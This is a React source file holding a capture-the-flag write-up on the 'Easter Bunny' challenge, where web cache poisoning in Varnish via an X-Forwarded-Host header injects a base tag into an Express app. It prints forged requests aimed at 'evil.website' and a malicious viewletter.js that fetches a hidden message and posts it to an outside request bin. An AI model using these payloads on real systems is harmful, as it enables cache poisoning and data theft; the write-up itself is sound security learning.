import { Link, Typography } from "@mui/material";
import * as React from "react";
import Inline from "~util/InlineCode";
import MultiLine from "~util/MultiLineCode";
import Quote from "~util/Quote";
import cop1 from "../../img/cop1.png";
import SourcedImage from "~util/SourcedImage";
import RabbitHole from "~util/RabbitHole";
import RedHerring from "~util/RedHerring";
import easter1 from "~img/easter1.png";
import Learning from "~util/Learning";

export const WriteupsEaster = {
    path: "easter",
    title: "Easter Bunny",
    tags: [
        "Hard",
        "@Express",
        "@Varnish Cache",
        "CSTI",
        "Cache Poisoning",
        "CSRF",
    ],
    description:
        "My first ever cache poisoning exploit, after countless rabbit holes and seven hours of research.",
    reflection: () => {
        return (
            <>
                <Typography>
                    Despite taking a really long time and getting lost a few
                    times, I was really proud to have solved this challenge, and
                    I learnt a lot in the process about HTTP caches and their
                    associated vulnerabilities. I also had two, more general
                    learnings.
                </Typography>
                <Learning title="Cache poisoning">
                    What an insidious and subtle exploit! I'm really happy that
                    I learned about one way you can trick a cache into doing
                    malicious things, all without the application or end user
                    noticing.
                </Learning>
                <Learning title="CSRF is the new XSS">
                    This was my first time exploiting a client-side request
                    forgery - well sort of, it was really an XSS that I used for
                    CSRF purposes. But still, it was interesting to do another
                    client-side exploit that wasn't just an XSS.
                </Learning>
                <Learning title="Do your dang recon">
                    So much of my time in this challenge was wasted because I
                    didn't look into the <Inline>cdn</Inline> parameter in the
                    template rendering command enough. Had I looked at this
                    properly and seen how it was used in the HTML template, I
                    probably wouldn't have gone down so many other rabbit holes.
                    <br />
                    <br />
                    Or maybe I would've. In any case, I need to do my recon more
                    thoroughly, and make sure that I understand what I'm looking
                    at before moving on.
                </Learning>
                <Learning dev title="Anything can be vulnerable">
                    The interesting thing about this challenge was that the
                    application itself was fine, and it was actually the cache
                    that was causing a vulnerability. This was a fairly
                    important lesson that we shouldn't trust anything by
                    default, and that the default should be that something isn't
                    secure if we haven't looked at it.
                </Learning>
            </>
        );
    },
    article: () => {
        return (
            <>
                <Typography>
                    We start off by checking out the Dockerfile to see if there
                    are any weirdly specific dependency versions that could have
                    existing CVEs. In npm's <Inline>{`package.json`}</Inline> we
                    have the following.
                </Typography>
                <MultiLine noNumber>{`"cookie-parser": "^1.4.6",
"express": "^4.17.2",
"nunjucks": "^3.2.3",
"puppeteer": "^13.3.2",
"sqlite-async": "1.1.2"`}</MultiLine>
                <Typography>
                    We also have Varnish 6.0 LTS, installed in the Dockerfile. A
                    quick Google of these libraries suggests that there aren't
                    any major CVEs in any of these packages.
                </Typography>
                <RedHerring title="Looking for Varnish CVEs" size="Small">
                    <Typography>
                        Well, it wasn't quite that straightforward. For some
                        reason I didn't realise that this was the LTE version of
                        Varnish 6.0, so I ended up digging through{" "}
                        <Link
                            href="https://varnish-cache.org/security/"
                            target="_blank"
                        >
                            some vulnerabilities
                        </Link>{" "}
                        in the original 6.0 version of Varnish Cache (there were
                        a few, including one request forgery CVE which I thought
                        could have been useful).
                    </Typography>
                </RedHerring>
                <Typography>
                    My next step was checking out the website after spinning up
                    the Docker container. The possible input vectors I found
                    were the letters ID and of course the letter submission
                    itself.
                </Typography>
                <Typography>
                    The general idea of the app seemed to be that you could
                    submit arbitrary messages to the server, which would then
                    show up in the list of messages. There was also a hidden
                    message, which contained the flag, that was only accessible
                    by 'admin users'.
                </Typography>
                <Typography>
                    Time to dig into the source code - one interesting thing
                    that I quickly noticed was the <Inline>bot.js</Inline> file.
                    This defined a <Inline>visit</Inline> function which seemed
                    to cause a Puppeteer bot to visit a given URL. This suggests
                    that we're trying to inject something into a page, get the
                    bot to visit it, and misuse their privileges to get the
                    hidden messages.
                </Typography>
                <MultiLine language="js">{`await page.setCookie({
    name: "auth",
    value: authSecret,
    domain: "127.0.0.1",
});

await page.goto(url, {
    waitUntil: "networkidle2",
    timeout: 5000,
});`}</MultiLine>
                <Typography>
                    This snippet of the bot's code gives us an idea of what kind
                    of protection they have in front of the hidden message -
                    checking for the auth cookie - but let's also check for
                    ourselves.
                </Typography>
                <MultiLine language="js">{`const isAdmin = (req, res) => {
    return req.ip === "127.0.0.1" && req.cookies["auth"] === authSecret;
};`}</MultiLine>
                <Typography>
                    That's interesting - it looks for the auth cookie as we
                    expected, but also is checking that the IP address comes
                    from an internal source. That probably means that rather
                    than doing an XSS to just get the auth cookie, we probably
                    also need to get the bot to make the request for us - so a
                    client-side request forgery (CSRF).
                </Typography>

                <Typography>
                    So if we want to get CSRF, we need to know when this{" "}
                    <Inline>visit</Inline> function is called. The only place
                    this happens is on submission of a new post, i.e. in the{" "}
                    <Inline>POST</Inline> request to the{" "}
                    <Inline>/submit</Inline> route. Specifically, it visits the
                    message that was most recently posted, probably to model
                    what an admin would be doing by checking the most recently
                    posted messages.
                </Typography>
                <MultiLine language="js">{`await visit(
    \`http://127.0.0.1/letters?id=\${inserted.lastID}\`,
    authSecret
);`}</MultiLine>
                <RabbitHole
                    title="Figuring out the Nunjucks templates"
                    size="Medium"
                >
                    <Typography>
                        I also spent some time looking at how the template
                        engine works. At this point, I hadn't seen a templating
                        engine before (thanks to modern technologies like
                        React), so it took some time to realise what they do. At
                        this stage, the main things I looked at were the{" "}
                        <Inline>{`{%%}`}</Inline> blocks in the templates.
                    </Typography>
                    <MultiLine noNumber>{`{% block content %}{% endblock %}
{% extends "base.html" %}
{% include "letter.html" %}`}</MultiLine>
                    <Typography>
                        Basically, these allow the reuse of common elements
                        (e.g. headers and footers) across multiple pages, and
                        aren't particularly relevant to this challenge, instead
                        being just a way to cut down on repetition of HTML code
                        across similar pages.
                    </Typography>
                    <Typography>
                        I also looked at how these pages were rendered - via the{" "}
                        <Inline>render</Inline> function:
                    </Typography>
                    <MultiLine language="js">{`return res.render("index.html", {
    cdn: \`\${req.protocol}://\${req.hostname}:\${
        req.headers["x-forwarded-port"] ?? 80
    }/static/\`,
});`}</MultiLine>
                    <Typography>
                        Unfortunately, at this stage, I didn't look too much
                        into the <Inline>cdn</Inline> argument here, which I
                        assumed was just a normal option for the render
                        function. This will come back to bite me later.
                    </Typography>
                </RabbitHole>
                <RedHerring title="Trying to XSS" size="Medium">
                    <Typography>
                        I then spent some time trying to perform an XSS in the
                        message. Checking how the content is loaded into the
                        page, the client-side <Inline>viewletter.js</Inline>{" "}
                        makes a fetch request to the message API and sets the
                        content using the following.
                    </Typography>
                    <Inline language="js">
                        letterText.value = data.message;
                    </Inline>
                    <Typography>
                        I spent a bit of time poking through the MDN
                        documentation for the <Inline>textarea</Inline> element,
                        but realistically the easiest way to test was just to
                        try submitting a{" "}
                        <Inline language="js">{`<script>alert(1)</script>`}</Inline>{" "}
                        to see if it would do anything. Unfortunately, it did
                        not.
                    </Typography>
                    <Typography>
                        But I wasn't done wasting time - I also tried searching
                        for any instance where innerHTML was used anywhere in
                        the codebase. I did find this function:
                    </Typography>
                    <MultiLine language="js">{`const typeMessage = (message) => {
    sendMessage.innerText = '';
    sendMessage.style.display = '';

    message.split('').forEach((char, index) => {
        setTimeout(() => {
            sendMessage.innerHTML += char;
        }, index * 100);
    });
};`}</MultiLine>
                    <Typography>
                        Sadly, this only types out fixed strings, as well as
                        errors when the fetch request fails. I spent some time
                        seeing if there was a way to get user input reflected in
                        the error message, but to no avail. Maybe this is
                        exploitable, but in any case it certainly doesn't need
                        to be an <Inline>innerHTML</Inline> here, so presumably
                        it was just a red herring.
                    </Typography>
                </RedHerring>
                <Typography>
                    At this stage I was starting to run out of ideas for places
                    to look, so I turned to browsing through the files that I
                    hadn't looked at yet. One that got my attention was the{" "}
                    <Inline>cache.vcl</Inline> file, which a quick look at the
                    Dockerfile told me was part of Varnish Cache.
                </Typography>
                <RabbitHole title="Learning about Varnish Cache" size="Deep">
                    <Typography>
                        This was a <strong>huge</strong> rabbit hole. While I'm
                        not unfamiliar with the idea of caching, I've never
                        heard of specific HTTP caches and certainly not Varnish
                        Cache specifically. Unfortunately, the documentation for
                        it is not terribly beginner friendly, and the
                        documentation for using the cache is mixed with
                        documentation for the internal VCL (Varnish
                        Configuration Language).
                    </Typography>
                    <Typography>
                        An hour or so later though, I did have a reasonable idea
                        of what the configuration in <Inline>cache.vcl</Inline>{" "}
                        was doing. The custom functions defined there are
                        prepended to the "default in-built heaviour", which
                        annoyingly I wasn't able to find, but apparently
                        'provides a sane default behaviour', which I assumed to
                        mean "isn't vulnerable".
                    </Typography>
                    <Typography>
                        At a high level, Varnish Cache tries to store responses
                        to HTTP queries to reduce server load. However, it needs
                        to avoid caching sensitive information to prevent
                        information leakage, and so needs to know how to
                        identify what can and can't be cached. It also needs to
                        know when to re-cache a request to allow updates to be
                        reflected to clients.
                    </Typography>
                    <Typography>
                        VCL is the language used to write functions to help
                        Varnish make these decisions. In my basic understanding,
                        the functions in <Inline>cache.vcl</Inline> are:
                        <ul>
                            <li>
                                <Inline>vcl_hash</Inline> - determines what
                                information is included in the hash which
                                determines whether two requests are the same. In
                                this case, the function includes the request URL
                                and host name.
                            </li>
                            <li>
                                <Inline>vcl_recv</Inline> - determines how to
                                process an incoming request. In this case, set
                                the forwarded URL, protocol, and port headers,
                                and remove any cookies from the request unless
                                it's to the <Inline>message</Inline> route.
                            </li>
                            <li>
                                <Inline>vcl_backend_response</Inline> -
                                determines how to process an response from the
                                backend. The index and letters pages are cached
                                for 60 seconds, while unsuccessful message{" "}
                                <Inline>GET</Inline> requests are 5 seconds and
                                successful ones for 120 seconds. Static
                                resources such as images and client-side scripts
                                are also cached for 120 seconds.
                            </li>
                            <li>
                                <Inline>vcl_deliver</Inline> - determines how to
                                process a response before it is sent back to the
                                client. This doesn't seem to do anything other
                                than add a header with the number of cache hits
                                that the current response has had.
                            </li>
                        </ul>
                    </Typography>
                </RabbitHole>
                <RedHerring title="Trying to cache the flag" size="Large">
                    <Typography>
                        Having now understood the cache, my first thought was to
                        try and get it to store the hidden message by making a
                        valid request via the bot, allowing me to request it
                        myself afterwards from the cache.
                    </Typography>
                    <Typography>
                        At this stage, I thought this would have worked, since
                        the VCL code seems to indicate that successful message{" "}
                        <Inline>GET</Inline> requests are cached for 120
                        seconds, plenty of time for me to make an identical
                        request and fetch it directly from the cache, thereby
                        bypassing the authentication check on the server.
                    </Typography>
                    <Typography>
                        The first requirement for this attack to succeed would
                        be to get the bot to actually visit the hidden message
                        (with ID 3) rather than the message that was just
                        submitted. The bot chooses the URL to visit by looking
                        at the last inserted ID into the database.
                    </Typography>
                    <MultiLine language="js">{`await visit(
    \`http://127.0.0.1/letters?id=\${inserted.lastID}\`,
    authSecret
);`}</MultiLine>
                    <RabbitHole title="SQL injection!?" size="Deep">
                        <Typography>
                            Yep, it's a rabbit hole in a red herring. This
                            challenge was <strong>fun</strong>.
                        </Typography>
                        <Typography>
                            I spent longer than I should've trying to see if
                            this <Inline>lastID</Inline> attribute could somehow
                            be tricked into holding an old ID. This involved
                            diving into the documentation of the{" "}
                            <Inline>node-sqlite</Inline> library, which had the
                            comment:
                        </Typography>
                        <Quote
                            sourceName="node-sqlite documentation"
                            sourceLink=""
                        >
                            lastID only contains valid information when the
                            query was a successfully completed INSERT statement
                            and changes only contains valid information when the
                            query was a successfully completed UPDATE or DELETE
                            statement. In all other cases, the content of these
                            properties is inaccurate and should not be used.
                        </Quote>
                        <Typography>
                            This got my hopes up - maybe someone had figured out
                            how to manipulate this to return something based on
                            user input when it wasn't valid. I wanted to first
                            know whether it was possible to make an invalid SQL
                            query.
                        </Typography>
                        <Typography>
                            The first thing that came to mind was overflowing
                            the size of the 300 character <Inline>data</Inline>{" "}
                            column, but the database didn't seem to notice.
                        </Typography>
                        <Typography>
                            It turns out that SQLite3 doesn't really care about
                            data types at all. A bit weird, but it seemed like I
                            wasn't going to get it to error out that way.
                        </Typography>
                        <Typography>
                            Then, in perhaps the weirdest (unintended?) exploit
                            I've seen during the project, I figured out how to
                            get a minor SQL injection, despite the application
                            using a sanitised statement construction method.
                        </Typography>
                        <Typography>
                            Basically, the server code takes the message to
                            insert out of the body. <Inline>express</Inline> was
                            configurd to use a JSON parser, meaning that I can
                            pass arbitrary JSON objects in my request body.
                        </Typography>
                        <Typography>
                            Now, looking at the code used to insert a new
                            message, we see that it does this:
                        </Typography>
                        <MultiLine language="js">
                            {`try {
    let stmt = await this.db.prepare(
        "INSERT INTO messages (message, hidden) VALUES (?, ?)"
    );
    resolve(await stmt.run(message, false));
} catch (e) {
    reject(e);
}`}
                        </MultiLine>
                        <Typography>
                            So the code is expecting <Inline>message</Inline> to
                            be a string, and then the <Inline>hidden</Inline>{" "}
                            column is set as false.
                        </Typography>
                        <Typography>
                            Funnily enough, the <Inline>node-sqlite</Inline>{" "}
                            library supports an alternate signature of the{" "}
                            <Inline>run</Inline> function which has its first
                            argument being an array of items to substitute into
                            the expression. Hopefully, you can see where this is
                            going.
                        </Typography>
                        <Typography>
                            Since we can craft custom objects for{" "}
                            <Inline>messsage</Inline>, we can make it an array
                            and have the second value be whatever we want. This
                            means we can create messages that are hidden, which
                            doesn't seem to be intended by the app, but is also
                            entirely useless for the actual challenge.
                        </Typography>
                        <Typography>
                            I did try using this trick to cause the{" "}
                            <Inline>hidden</Inline> column to store a string
                            rather than an integer to see if SQLite would throw
                            an error, but as mentioned earlier, SQLite doesn't
                            internally have a type system at all.
                        </Typography>
                        <Typography>
                            At this stage I decided to see what the 'undefined'
                            value of <Inline>lastID</Inline> was likely to be,
                            which involved looking through the{" "}
                            <Inline>node-sqlite</Inline> source code and then
                            the SQLite3 documentation. Here's what they had to
                            say about it.
                        </Typography>
                        <Quote
                            sourceName="SQLite3 documentation"
                            sourceLink="https://www.sqlite.org/c3ref/last_insert_rowid.html"
                        >
                            The sqlite3_last_insert_rowid(D) interface usually
                            returns the rowid of the most recent successful
                            INSERT into a rowid table or virtual table on
                            database connection D.
                        </Quote>
                        <Typography>
                            Darn, so it would've just been the last successful
                            insert even if I had managed it. There was another
                            snippet of the documentation that sparked some hope:
                        </Typography>
                        <Quote
                            sourceName="SQLite3 documentation"
                            sourceLink="https://www.sqlite.org/c3ref/last_insert_rowid.html"
                        >
                            As well as being set automatically as rows are
                            inserted into database tables, the value returned by
                            this function may be set explicitly by
                            sqlite3_set_last_insert_rowid()
                        </Quote>
                        <Typography>
                            As you might imagine though, there were no instances
                            of this being called in <Inline>node-sqlite</Inline>
                            . This was about the moment where I realised this
                            whole exploration had been completely irrelevant to
                            the challenge - but at least I found a cool SQL
                            injection?
                        </Typography>
                    </RabbitHole>
                    <Typography>
                        I eventually realised that there's no way to get the
                        bost to visit the hidden message (see the rabbit hole
                        for an explanation of how I figured this out) - but not
                        wanting to give up hope just yet, I decided to check
                        whether I would even be able to retrieve the hidden
                        message if I somehow got the bot to request it.
                    </Typography>
                    <Typography>
                        To do this, I removed the part of the auth check that
                        validates that the request was made from{" "}
                        <Inline>127.0.0.1</Inline> and making it print the auth
                        secret. I then made two requests to the server to fetch
                        the hidden message, the first with the auth cookie,
                        which succeeded as expected, and the second without the
                        auth cookie to see if the cached response would be
                        returned. It was not.
                    </Typography>
                    <Typography>
                        I was pretty surprised by this, but eventually found the
                        culprit - when the backend responds with a hidden
                        message, it also does the following.
                    </Typography>
                    <MultiLine language="js">
                        {`res.set(
    "Cache-Control",
    "private, max-age=0, s-maxage=0 ,no-cache, no-store"
);`}
                    </MultiLine>
                    <Typography>
                        This pretty obviously prevents the response being
                        cached, but to confirm, a quick Google shows that the
                        Varnish default VCL sensibly won't cache anything with
                        these headers. The nail in the coffin is that the second
                        response in my little experiment comes back with the
                        header <Inline>X-Cache: MISS</Inline>, meaning that it
                        didn't find a cached response.
                    </Typography>
                    <Typography>
                        This was very tragic, but not at all useless, since it
                        gave me a much better grip on how Varnish Cache works.
                    </Typography>
                </RedHerring>
                <Typography>
                    With not much else to go off, I decided to look up web cache
                    problems, and one of the first things that comes up is cache
                    poisoning.
                </Typography>
                <Quote
                    sourceName="PortSwigger"
                    sourceLink="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws"
                >
                    In short, websites are vulnerable to web cache poisoning if
                    they handle unkeyed input in an unsafe way and allow the
                    subsequent HTTP responses to be cached. This vulnerability
                    can be used as a delivery method for a variety of different
                    attacks.
                </Quote>
                <Typography>
                    Having read this article, my idea is basically to get a
                    malicious version of the <Inline>/letters</Inline> route
                    cached, which should be achievable since it isn't a
                    protected page. Then, when the bot goes to the page, it'll
                    get the malicious version which will let me send a request
                    on their behalf, achieving the goal of CSRF.
                </Typography>
                <Typography>
                    With this in mind and few remaining options, I take another
                    look at the source code for anything I can control, and I
                    notice this snippet (for the second time, if you've been
                    following the rabbit holes).
                </Typography>
                <MultiLine language="js">{`return res.render("index.html", {
    cdn: \`\${req.protocol}://\${req.hostname}:\${
        req.headers["x-forwarded-port"] ?? 80
    }/static/\`,
});`}</MultiLine>
                <Typography>
                    At this stage, I realise what I should've noticed much
                    earlier - the <Inline>cdn</Inline> here is actually being
                    injected into a template! And as a base element, too.
                </Typography>
                <Typography>
                    A base element is used as the root of all relative paths
                    referenced in a HTML document. The implications of this are
                    fairly obvious - by injecting a malicious base, I can
                    basically get free XSS (and therefore CSRF) by replacing
                    real Javascript scripts from their server with malicious
                    ones from my own.
                </Typography>
                <Typography>
                    A quick proof of concept works fine. By sending a HTTP
                    request that looks something like the below...
                </Typography>
                <MultiLine noNumber>
                    {`GET /letters HTTP/1.1
Host: evil.website:1337
...`}
                </MultiLine>
                <Typography>
                    ...we get a response that contains the following.
                </Typography>
                <Inline language="html">{`<base href="http://evil.website:1337/static/" />`}</Inline>
                <Typography>
                    There's a new problem now though. Varnish Cache uses the{" "}
                    <Inline>Host</Inline> header to decide whether or not two
                    requests are the same for the purposes of caching. That
                    means that to get the cache to deliver the malicious site,
                    we need the host to be <Inline>127.0.0.1</Inline>, since
                    this is what the bot will be requesting.
                </Typography>
                <Typography>
                    Our last hope is that either we can inject via one of the
                    other headers - <Inline>req.protocol</Inline> or the{" "}
                    <Inline>X-Forwarded-Port</Inline> header - or, that{" "}
                    <Inline>req.hostname</Inline> doesn't actually read from the{" "}
                    <Inline>Host</Inline> header itself.
                </Typography>
                <Typography>
                    Unfortunately, the Varnish server sets the protocol and port
                    headers, so these aren't viable targets. But, thankfully,
                    our <Inline>req.hostname</Inline> idea delivers.
                </Typography>
                <Quote
                    sourceName="ExpressJS documentation"
                    sourceLink="https://expressjs.com/en/api.html#req"
                >
                    When the trust proxy setting does not evaluate to false,
                    this property will instead get the value from the
                    X-Forwarded-Host header field. This header can be set by the
                    client or by the proxy. If there is more than one
                    X-Forwarded-Host header in the request, the value of the
                    first header is used. This includes a single header with
                    comma-separated values, in which the first value is used.
                </Quote>
                <Inline language="js">
                    app.set('trust proxy', process.env.PROXY !== 'false');
                </Inline>
                <Typography>
                    Well - that's awfully convenient. So we can keep the{" "}
                    <Inline>Host</Inline> as <Inline>127.0.0.1</Inline> in our
                    malicious request, while setting the{" "}
                    <Inline>X-Forwarded-Host</Inline> to be our malicious CDN
                    for injection into the template. As a test of this, we try:
                </Typography>
                <MultiLine noNumber>
                    {`GET /letters HTTP/1.1
Host: 127.0.0.1
X-Forwarded-Host: evil.website:1337
...`}
                </MultiLine>
                <Typography>And in the response:</Typography>
                <Inline language="html">{`<base href="http://evil.website:80/static/" />`}</Inline>
                <Typography>
                    It works! It doesn't seem to respect the port we choose, but
                    that's probably because of some cache shenanigans, and we
                    can work around it.
                </Typography>
                <RabbitHole
                    title="Public tunnels don't like being used for hacking"
                    size="Medium"
                >
                    <Typography>
                        My first attempt at a proof of concept for the exploit
                        is by using a locally hosted Python HTTP server, exposed
                        to the internet via a public tunnel with{" "}
                        <Link href="https://ngrok.com/" target="_blank">
                            ngrok
                        </Link>
                        , a service which lets you connect a local port to a
                        public URL.
                    </Typography>
                    <Typography>
                        Unfortunately, this doesn't work since ngrok has a
                        anti-phishing page designed to stop dodgy people from
                        using it to host credential phishing sites. Good job
                        ngrok, but a bit unfortunate for me, since the bot won't
                        click that button.
                    </Typography>
                    <SourcedImage
                        src={easter1}
                        height="30vh"
                        sourceName="Own screenshot"
                    />
                    <Typography>
                        I also try a few ngrok alternatives from{" "}
                        <Link
                            href="https://github.com/anderspitman/awesome-tunneling"
                            target="_blank"
                        >
                            this list
                        </Link>{" "}
                        to see if there are any dodgy options which don't have
                        such protections, but was pleasantly surprised (but also
                        sad) to see that a lot of them do. So I'll need my own
                        server to host my evil files.
                    </Typography>
                </RabbitHole>
                <Typography>
                    So, to get the exploit working, I wrote a quick malicious{" "}
                    <Inline>viewletter.js</Inline>, which is automatically
                    loaded and run by <Inline>viewletters.html</Inline>.
                </Typography>
                <MultiLine language="js">{`fetch("http://127.0.0.1/message/3").then((x) =>
    x.text().then((y) =>
        fetch("<requestbin URL>", {
            method: "POST",
            mode: "cors",
            body: y,
        })
    )
);`}</MultiLine>
                <RabbitHole title="A real life attack" size="Shallow">
                    <Typography>
                        While writing this up, I realised that although in this
                        case I injected a very broken{" "}
                        <Inline>viewletter.js</Inline>, we could theoretically
                        have delivered a static folder which was identical to
                        the real one except for the CSRF.
                    </Typography>
                    <Typography>
                        This is kind of scary, since that means to the user,
                        there would be pretty much no indication that anything
                        was wrong - they'd be visiting the correct URL and
                        everything would appear to be working correctly.
                    </Typography>
                </RabbitHole>
                <Typography>
                    I put this in a <Inline>static</Inline> folder on my server
                    and start up a HTTP server on port 80. To pull off the
                    exploit, I make the malicious request for the ID of the next
                    message.
                </Typography>
                <MultiLine noNumber>
                    {`GET /letters/?id=<next id> HTTP/1.1
Host: 127.0.0.1
X-Forwarded-Host: <my server url>
...`}
                </MultiLine>
                <Typography>
                    Then, within the 60 seconds that the page is cached for, I
                    just submit any message. The bot makes a request to the same
                    URL and hostname that my malicious request has already
                    cached, receives the CSRF script from my server, and
                    delivers the flag-containing hidden message straight into my
                    request bin. Success at last!
                </Typography>
            </>
        );
    },
};
